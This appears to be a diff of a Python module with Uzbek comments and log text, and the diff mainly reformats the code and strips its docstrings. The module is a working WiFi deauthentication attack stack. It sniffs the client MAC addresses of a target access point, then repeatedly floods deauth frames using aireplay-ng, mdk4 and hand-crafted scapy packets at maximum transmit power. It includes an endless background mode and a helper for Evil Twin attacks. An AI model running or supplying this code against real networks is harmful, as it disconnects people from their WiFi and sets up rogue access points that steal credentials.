@@ -1,53 +1,27 @@
 #!/usr/bin/env python3
-"""
-Kuchli deauth stack (airgeddon + kuchaytirilgan):
-  1) aireplay-ng  — broadcast + directed (client MAC)
-  2) mdk4         — mass deauth (bor bo'lsa)
-  3) scapy sniff  — real-time client MAC yig'ish
-
-Ubuntu + Kali. Monitor: airmon_start (xavfsiz check kill).
-"""
-
 from __future__ import annotations
-
 import os
 import re
 import subprocess
 import threading
 import time
 from typing import Callable, List, Optional, Set
-
 import wifi_util as wu
-
 try:
-    from scapy.all import (  # type: ignore
-        Dot11,
-        Dot11Deauth,
-        Dot11Beacon,
-        RadioTap,
-        sniff,
-        sendp,
-    )
-
+    from scapy.all import Dot11, Dot11Deauth, Dot11Beacon, RadioTap, sniff, sendp
     HAS_SCAPY = True
 except ImportError:
     HAS_SCAPY = False
-
-
-_MAC_RE = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
-
+_MAC_RE = re.compile('(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
 
 def _norm_mac(mac: str) -> str:
     return mac.strip().upper()
 
-
 def _is_broadcast(mac: str) -> bool:
     m = _norm_mac(mac)
-    return m in ("FF:FF:FF:FF:FF:FF", "00:00:00:00:00:00")
-
+    return m in ('FF:FF:FF:FF:FF:FF', '00:00:00:00:00:00')
 
 class ClientTracker:
-    """Asl AP atrofidagi klient MAC larni yig'adi."""
 
     def __init__(self, bssid: str):
         self.bssid = _norm_mac(bssid)
@@ -82,18 +56,16 @@ class ClientTracker:
             return
         try:
             d = pkt[Dot11]
-            addrs = [d.addr1, d.addr2, d.addr3, getattr(d, "addr4", None)]
+            addrs = [d.addr1, d.addr2, d.addr3, getattr(d, 'addr4', None)]
             bssid = self.bssid
-            related = any(
-                a and _norm_mac(a) == bssid for a in addrs if a
-            )
+            related = any((a and _norm_mac(a) == bssid for a in addrs if a))
             if not related:
                 return
             for a in addrs:
                 if not a:
                     continue
                 ma = _norm_mac(a)
-                if ma != bssid and not _is_broadcast(ma):
+                if ma != bssid and (not _is_broadcast(ma)):
                     self.add(ma)
         except Exception:
             pass
@@ -107,43 +79,23 @@ class ClientTracker:
         self._stop.clear()
 
         def loop():
-            log(f"[+] Mijoz kuzatuvi boshlandi @ {mon_iface} (BSSID {self.bssid})")
+            log(f'[+] Mijoz kuzatuvi boshlandi @ {mon_iface} (BSSID {self.bssid})')
             while not self._stop.is_set():
                 try:
-                    sniff(
-                        iface=mon_iface,
-                        prn=self._on_packet,
-                        store=False,
-                        timeout=4,
-                    )
+                    sniff(iface=mon_iface, prn=self._on_packet, store=False, timeout=4)
                 except Exception:
                     if self._stop.wait(1):
                         break
             log("[*] Mijoz kuzatuvi to'xtadi")
-
         self._thread = threading.Thread(target=loop, daemon=True)
         self._thread.start()
 
     def stop_sniff(self) -> None:
         self._stop.set()
 
-
 class DeauthStack:
-    """
-    Kuchli deauth stack:
-      - broadcast aireplay
-      - directed aireplay (har bir client MAC)
-      - mdk4 d -B bssid (bor bo'lsa)
-      - scapy client discovery
-    """
 
-    def __init__(
-        self,
-        mon_iface: str,
-        bssid: str,
-        channel: int = 6,
-        log: Callable = print,
-    ):
+    def __init__(self, mon_iface: str, bssid: str, channel: int=6, log: Callable=print):
         self.mon = mon_iface
         self.bssid = _norm_mac(bssid)
         try:
@@ -155,128 +107,63 @@ class DeauthStack:
         self._stop = threading.Event()
         self._thread: Optional[threading.Thread] = None
         self._mdk4_proc: Optional[subprocess.Popen] = None
-        self.has_mdk4 = wu.which("mdk4") is not None
-        self.has_aireplay = wu.which("aireplay-ng") is not None
-        self.stats = {
-            "broadcast": 0,
-            "directed": 0,
-            "mdk4": 0,
-            "rounds": 0,
-        }
+        self.has_mdk4 = wu.which('mdk4') is not None
+        self.has_aireplay = wu.which('aireplay-ng') is not None
+        self.stats = {'broadcast': 0, 'directed': 0, 'mdk4': 0, 'rounds': 0}
 
-    def seed_clients(self, macs: Optional[List[str]] = None) -> None:
+    def seed_clients(self, macs: Optional[List[str]]=None) -> None:
         self.tracker.add_many(macs)
 
-    def _aireplay_broadcast(self, count: int = 10) -> bool:
+    def _aireplay_broadcast(self, count: int=10) -> bool:
         if not self.has_aireplay:
             return False
-        # qisqa timeout — twin/deauth osilib qolmasin
-        r = wu.run(
-            [
-                "aireplay-ng",
-                "-0",
-                str(count),
-                "-a",
-                self.bssid,
-                "--ignore-negative-one",
-                self.mon,
-            ],
-            timeout=8,
-        )
-        self.stats["broadcast"] += count
+        r = wu.run(['aireplay-ng', '-0', str(count), '-a', self.bssid, '--ignore-negative-one', self.mon], timeout=8)
+        self.stats['broadcast'] += count
         return True
 
-    def _aireplay_directed(self, client: str, count: int = 6) -> None:
+    def _aireplay_directed(self, client: str, count: int=6) -> None:
         if not self.has_aireplay:
             return
-        wu.run(
-            [
-                "aireplay-ng",
-                "-0",
-                str(count),
-                "-a",
-                self.bssid,
-                "-c",
-                client,
-                "--ignore-negative-one",
-                self.mon,
-            ],
-            timeout=6,
-        )
-        self.stats["directed"] += count
+        wu.run(['aireplay-ng', '-0', str(count), '-a', self.bssid, '-c', client, '--ignore-negative-one', self.mon], timeout=6)
+        self.stats['directed'] += count
 
-    def _mdk4_burst(self, seconds: float = 2.0) -> None:
+    def _mdk4_burst(self, seconds: float=2.0) -> None:
         if not self.has_mdk4:
             return
         try:
-            proc = subprocess.Popen(
-                ["mdk4", self.mon, "d", "-B", self.bssid],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
+            proc = subprocess.Popen(['mdk4', self.mon, 'd', '-B', self.bssid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(min(seconds, 2.5))
             proc.terminate()
             try:
                 proc.wait(timeout=1.5)
             except Exception:
                 proc.kill()
-            self.stats["mdk4"] += 1
+            self.stats['mdk4'] += 1
         except Exception as e:
-            self.log(f"[!] mdk4: {e}")
+            self.log(f'[!] mdk4: {e}')
 
-    def _scapy_directed(self, client: str, count: int = 4) -> None:
-        """Zaxira: scapy orqali deauth (aireplay ishlamasa)."""
+    def _scapy_directed(self, client: str, count: int=4) -> None:
         if not HAS_SCAPY:
             return
         try:
-            pkt1 = (
-                RadioTap()
-                / Dot11(
-                    type=0,
-                    subtype=12,
-                    addr1=client,
-                    addr2=self.bssid,
-                    addr3=self.bssid,
-                )
-                / Dot11Deauth(reason=7)
-            )
-            pkt2 = (
-                RadioTap()
-                / Dot11(
-                    type=0,
-                    subtype=12,
-                    addr1=self.bssid,
-                    addr2=client,
-                    addr3=self.bssid,
-                )
-                / Dot11Deauth(reason=7)
-            )
-            sendp(
-                [pkt1, pkt2] * count,
-                iface=self.mon,
-                verbose=0,
-            )
-            self.stats["directed"] += count
+            pkt1 = RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
+            pkt2 = RadioTap() / Dot11(type=0, subtype=12, addr1=self.bssid, addr2=client, addr3=self.bssid) / Dot11Deauth(reason=7)
+            sendp([pkt1, pkt2] * count, iface=self.mon, verbose=0)
+            self.stats['directed'] += count
         except Exception:
             pass
 
-    def burst(self, seconds: int = 12) -> None:
-        """Bir martalik kuchli to'lqin."""
+    def burst(self, seconds: int=12) -> None:
         if not wu.iface_exists(self.mon):
             self.log(f"[-] Monitor interfeys yo'q: {self.mon}")
             return
         wu.set_channel(self.mon, self.channel, force_raw=True)
         wu.set_txpower_max(self.mon, log=self.log)
         self.tracker.start_sniff(self.mon, log=self.log)
-
-        self.log(
-            f"[*] Uzish to'lqini {seconds}s | BSSID={self.bssid} | "
-            f"aireplay={'bor' if self.has_aireplay else 'yoq'} "
-            f"mdk4={'bor' if self.has_mdk4 else 'yoq'}"
-        )
+        self.log(f"[*] Uzish to'lqini {seconds}s | BSSID={self.bssid} | aireplay={('bor' if self.has_aireplay else 'yoq')} mdk4={('bor' if self.has_mdk4 else 'yoq')}")
         end = time.time() + seconds
         while time.time() < end:
-            self.stats["rounds"] += 1
+            self.stats['rounds'] += 1
             self._aireplay_broadcast(5)
             clients = self.tracker.list()
             for mac in clients[:4]:
@@ -288,32 +175,23 @@ class DeauthStack:
             if time.time() < end:
                 self._mdk4_burst(1.2)
             time.sleep(0.15)
-
-        self.log(
-            f"[+] To'lqin tugadi | mijozlar={self.tracker.count()} | "
-            f"efir={self.stats['broadcast']} yo'naltirilgan={self.stats['directed']}"
-        )
+        self.log(f"[+] To'lqin tugadi | mijozlar={self.tracker.count()} | efir={self.stats['broadcast']} yo'naltirilgan={self.stats['directed']}")
 
     def start_continuous(self) -> None:
-        """Cheksiz fon deauth."""
         if self._thread and self._thread.is_alive():
             return
         if not wu.iface_exists(self.mon):
             self.log(f"[-] Monitor interfeys yo'q: {self.mon}")
             return
-
         wu.set_channel(self.mon, self.channel, force_raw=True)
         wu.set_txpower_max(self.mon, log=self.log)
         self.tracker.start_sniff(self.mon, log=self.log)
         self._stop.clear()
 
         def loop():
-            self.log(
-                f"[+] Uzish boshlandi @ {self.mon} → {self.bssid} | "
-                f"mdk4={'yoqilgan' if self.has_mdk4 else 'o‘chiq'}"
-            )
+            self.log(f"[+] Uzish boshlandi @ {self.mon} → {self.bssid} | mdk4={('yoqilgan' if self.has_mdk4 else 'o‘chiq')}")
             while not self._stop.is_set():
-                self.stats["rounds"] += 1
+                self.stats['rounds'] += 1
                 self._aireplay_broadcast(10)
                 clients = self.tracker.list()
                 for mac in clients[:16]:
@@ -324,16 +202,10 @@ class DeauthStack:
                         self._scapy_directed(mac, 3)
                 if not self._stop.is_set():
                     self._mdk4_burst(2.0)
-                if self.stats["rounds"] % 8 == 0:
-                    self.log(
-                        f"[uzish] raund={self.stats['rounds']} "
-                        f"mijozlar={self.tracker.count()} "
-                        f"efir={self.stats['broadcast']} "
-                        f"yo'naltirilgan={self.stats['directed']}"
-                    )
+                if self.stats['rounds'] % 8 == 0:
+                    self.log(f"[uzish] raund={self.stats['rounds']} mijozlar={self.tracker.count()} efir={self.stats['broadcast']} yo'naltirilgan={self.stats['directed']}")
                 self._stop.wait(0.8)
             self.log("[*] Uzish to'xtatildi")
-
         self._thread = threading.Thread(target=loop, daemon=True)
         self._thread.start()
 
@@ -346,37 +218,25 @@ class DeauthStack:
             except Exception:
                 pass
             self._mdk4_proc = None
-        wu.run(["pkill", "-x", "aireplay-ng"])
-        wu.run(["pkill", "-x", "mdk4"])
+        wu.run(['pkill', '-x', 'aireplay-ng'])
+        wu.run(['pkill', '-x', 'mdk4'])
         if self._thread:
             self._thread.join(timeout=3)
             self._thread = None
 
-
-def run_infinite_deauth(
-    mon_iface: str,
-    bssid: str,
-    channel=None,
-    log=print,
-    extra_clients: Optional[List[str]] = None,
-) -> None:
-    """
-    Menyu #1: cheksiz deauth stack (airgeddon).
-    Monitor yo'q bo'lsa — airmon_start.
-    """
+def run_infinite_deauth(mon_iface: str, bssid: str, channel=None, log=print, extra_clients: Optional[List[str]]=None) -> None:
     iface = mon_iface
     if not wu.iface_exists(iface):
         iface = wu.resolve_station(mon_iface, log=log)
     mon = None
     if iface:
-        if wu.iface_type(iface) == "monitor":
+        if wu.iface_type(iface) == 'monitor':
             mon = iface
         else:
             mon = wu.airmon_start(iface, log=log)
     if not mon:
         log("[-] Monitor interfeys yo'q")
         return
-
     try:
         ch = int(channel) if channel is not None else 6
     except (TypeError, ValueError):
@@ -385,11 +245,9 @@ def run_infinite_deauth(
     stack = DeauthStack(mon, bssid, channel=ch, log=log)
     if extra_clients:
         stack.seed_clients(extra_clients)
-
-    log(f"[*] Kuchli uzish | mon={mon} kanal={ch} | BSSID={bssid}")
-    log("    vositalar: aireplay (efir) + aireplay (mijoz) + mdk4 + scapy")
+    log(f'[*] Kuchli uzish | mon={mon} kanal={ch} | BSSID={bssid}')
+    log('    vositalar: aireplay (efir) + aireplay (mijoz) + mdk4 + scapy')
     log("    To'xtatish: Ctrl+C")
-
     try:
         stack.burst(seconds=8)
         stack.start_continuous()
@@ -400,15 +258,7 @@ def run_infinite_deauth(
     finally:
         stack.stop()
 
-
-def make_stack_for_twin(
-    mon: str,
-    bssid: str,
-    channel: int,
-    log=print,
-    seed_clients: Optional[List[str]] = None,
-) -> DeauthStack:
-    """Evil Twin ichida ishlatish uchun stack yaratish."""
+def make_stack_for_twin(mon: str, bssid: str, channel: int, log=print, seed_clients: Optional[List[str]]=None) -> DeauthStack:
     stack = DeauthStack(mon, bssid, channel=channel, log=log)
     if seed_clients:
         stack.seed_clients(seed_clients)
